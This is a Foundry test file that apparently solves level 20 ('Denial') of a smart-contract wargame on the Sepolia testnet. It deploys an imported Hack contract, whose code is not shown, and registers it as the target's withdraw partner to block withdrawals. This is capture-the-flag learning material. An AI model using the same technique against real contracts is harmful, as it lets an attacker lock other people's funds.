//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Hack} from "../src/level20.sol";

interface IDenial {
    function partner() external view returns (address);

    function owner() external view returns (address);

    function setWithdrawPartner(address _partner) external;

    function withdraw() external;

    function contractBalance() external view returns (uint256);
}

contract level20Test is Test {
    IDenial target;

    function setUp() public {
        vm.createSelectFork("SEPOLIA");
        address instanceAddress = vm.envAddress("INSTANCE_AD");
        target = IDenial(instanceAddress);
    }

    function testSolvesLeve20() public {
        address hacker = makeAddr("hacker");
        address partnerBefore = target.partner();
        console.log("Partner before: ", partnerBefore);

        vm.startPrank(hacker, hacker);
        Hack hackContract = new Hack(payable(address(target)));
        target.setWithdrawPartner(address(hackContract));
        vm.stopPrank();

        address partnerAfter = target.partner();
        console.log("Partner after: ", partnerAfter);
        assertEq(target.partner(), address(hackContract));
    }
}
//INSTANCE_AD=0xb61f80157D71C278232B324e70e815a424A95b03 forge test --mt testSolvesLeve20 -vvv
